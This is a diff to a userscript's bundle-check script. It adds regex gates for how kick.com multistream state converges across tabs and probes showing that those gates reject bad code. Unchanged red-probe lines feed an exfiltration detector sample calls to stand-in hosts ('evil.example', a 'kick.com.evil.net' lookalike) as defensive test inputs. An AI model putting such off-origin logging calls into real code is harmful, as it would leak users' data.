@@ -186,6 +186,28 @@ const organizerPatchesInPlace = (bundle) => /function patchStickerTileStates/.te
   && /patchStickerTileStates\(gridHost\)/.test(bundle)
   && bundle.includes('data-kf-sticker-state="${pinned}:${hidden}"');
 
+/**
+ * Cross-tab convergence must stay a nudge, never the mechanism.
+ *
+ * `BroadcastChannel` and `localStorage` are scoped to one origin while the
+ * userscript's GM storage is not, so a `www.kick.com` tab and a `kick.com` tab
+ * can share a store without hearing each other. That is survivable only because
+ * the store is re-read on every commit and on open; a design that applied
+ * broadcasts to an in-memory grid instead would diverge silently. These assert
+ * the re-reads exist and that a receiving tab never writes back — which is what
+ * stops two tabs echoing an op at each other.
+ */
+const convergenceRereads = (bundle) =>
+  /function commitMultistream[\s\S]{0,400}?mergeMultistream\(gmGet\(MULTISTREAM_KEY/.test(bundle)
+  && /function openMultistream[\s\S]{0,600}?commitMultistream\(\);/.test(bundle)
+  && /function applyRemoteMultistream[\s\S]{0,600}?mergeMultistream\(gmGet\(MULTISTREAM_KEY/.test(bundle);
+const remoteApplyNeverWrites = (bundle) => {
+  const start = bundle.indexOf('function applyRemoteMultistream');
+  if (start === -1) return false;
+  const body = bundle.slice(start, bundle.indexOf('\n  }', start));
+  return !/gmSet\(|broadcastMultistream\(/.test(body);
+};
+
 /** Any `innerHTML =` in a shipped bundle that is not handed to the policy. */
 const bareHTMLWrite = /\.innerHTML\s*=(?!\s*trustedHTML\()/g;
 const unroutedHTML = bundleTargets
@@ -434,6 +456,13 @@ const checks = [
   // Favorites are ordered and scoped. The shelf must render them in the stored
   // order rather than the picker's, or the ordering controls do nothing
   // visible; and the order has to be part of the render signature.
+  ['discovery cards carry a multi chip, only where the card is a channel',
+    source.includes('data-kf-card-action="multi"') && source.includes('cardSlugFromPath(path)')
+    && source.includes('function syncCardMultiState')],
+  ['cross-tab convergence re-reads the store rather than trusting the wire', convergenceRereads(source)],
+  ['a tab applying another tab’s change never writes back or re-broadcasts', remoteApplyNeverWrites(source)],
+  ['a shared link says what it replaced and offers it back',
+    /Shared layout replaced/.test(source) && /Your own multi-stream grid is back\./.test(source)],
   ['the organizer grid renders a bounded window with spacers, not the whole library', organizerWindows(source)],
   ['spacer arithmetic agrees with the grid CSS it stands in for', spacerMathMatchesCss(source)],
   ['organizer search is debounced rather than firing on every keystroke', organizerDebouncesSearch(source)],
@@ -689,6 +718,12 @@ const redProbes = [
   ['exfil gate would catch an off-origin api call', EXFIL_REGEX.test('fetch(`https://evil.example/api/v1/log`)')],
   ['exfil gate would catch a lookalike host', EXFIL_REGEX.test('https://kick.com.evil.net/api/v1/log')],
   ['shadow-a11y gate would reject a bundle with no host-keyed rules', !shadowAccessibilityWired('')],
+  ['convergence gate would reject a broadcast applied straight to memory',
+    !convergenceRereads('function applyRemoteMultistream(added) { state.multistream.streams.push(...added); }')],
+  ['echo gate would catch a receiving tab that writes back',
+    !remoteApplyNeverWrites('function applyRemoteMultistream(a, r) {\n    state.multistream = merge(a, r);\n    gmSet(MULTISTREAM_KEY, state.multistream);\n  }')],
+  ['echo gate accepts a receiving tab that only re-reads',
+    remoteApplyNeverWrites('function applyRemoteMultistream(a, r) {\n    state.multistream = mergeMultistream(gmGet(MULTISTREAM_KEY, {}), state.multistream, a, r);\n  }')],
   ['window gate would reject an organizer that renders the whole list',
     !organizerWindows("gridHost.innerHTML = trustedHTML(visible.map(stickerProxyMarkup).join(''));")],
   ['spacer-math gate would catch CSS drifting from the constants',
